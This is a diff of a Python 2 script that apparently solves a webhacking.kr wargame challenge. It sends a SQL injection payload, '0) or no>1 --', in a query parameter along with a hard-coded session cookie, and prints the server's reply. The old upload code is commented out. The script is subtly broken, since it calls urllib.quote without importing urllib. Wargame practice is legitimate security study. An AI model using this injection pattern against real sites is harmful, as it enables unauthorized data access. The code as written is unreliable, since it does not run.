@@ -1,20 +1,35 @@
 #-*- coding: utf-8 -*-
-import codecs
-import sys
-
+import urllib2
 import requests
-
 import CookieManager
 
 
-challengeUrl = "http://webhacking.kr/challenge/web/web-14"
+challengeUrl = "http://webhacking.kr/challenge/web/web-14/index.php"
 
+CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
+
+parameter = urllib.quote("0) or no>1 --")
+httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
+httpRequest.add_header("Cookie", CookieManager.getCookie())
+
+httpConnection = None
+try:
+    httpConnection = urllib2.urlopen(httpRequest)
+    httpResponse = httpConnection.read()
+    print httpResponse
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
+
+"""
 uploadFile = {
-    "upfile": open("Challenge21.py")
+    "upfile": open(".project", "rb")
 }
 
 sessionCookie = {
-    "PHPSESSID": "a51840b57e5b3e4fb1af134b4054c3a1"
+    "PHPSESSID": "a90f69bdc1cdceaf479ca1ebcd368d29"
 }
 
 httpConnection = None
@@ -30,3 +45,4 @@ except:
 finally:
     if httpConnection != None:
         httpConnection.close()
+"""
